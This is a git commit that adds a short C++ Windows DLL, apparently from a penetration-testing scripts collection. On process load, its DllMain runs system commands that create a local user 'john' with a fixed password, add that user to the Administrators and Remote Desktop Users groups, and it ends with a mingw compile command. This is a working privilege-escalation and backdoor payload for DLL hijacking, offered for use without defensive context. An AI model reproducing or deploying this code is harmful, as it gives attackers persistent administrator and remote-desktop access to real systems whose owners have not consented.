e0afb482981ae4d3ccf13b9774214160cedea24b
Szwochm <maciejszwoch@yahoo.com>
2023-06-28 21:51:01 -0500

    Create adduserRDP-DLL.cpp

---
+++ Scripts/adduserRDP-DLL.cpp
@@ -0,0 +1,25 @@
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user john Password123! /add");
+  	    i = system("net localgroup administrators john /add && net localgroup \"Remote Desktop Users\" john /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+// compile for x64: x86_64-w64-mingw32-gcc adduserRDP-DLL.cpp --shared -o myDLL.dll
